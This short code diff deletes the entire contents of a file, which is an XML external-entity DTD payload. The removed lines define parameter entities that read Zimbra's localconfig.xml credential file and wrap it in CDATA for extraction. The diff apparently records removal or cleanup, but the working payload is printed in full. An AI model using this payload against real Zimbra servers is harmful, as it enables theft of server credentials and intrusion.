@@ -1,3 +1,1 @@
-<!ENTITY % aewg SYSTEM "file:///opt/zimbra/conf/localconfig.xml">
-<!ENTITY % cecxm "<!ENTITY xgzc '<![CDATA[%aewg;]]>'>">
-%cecxm;
+
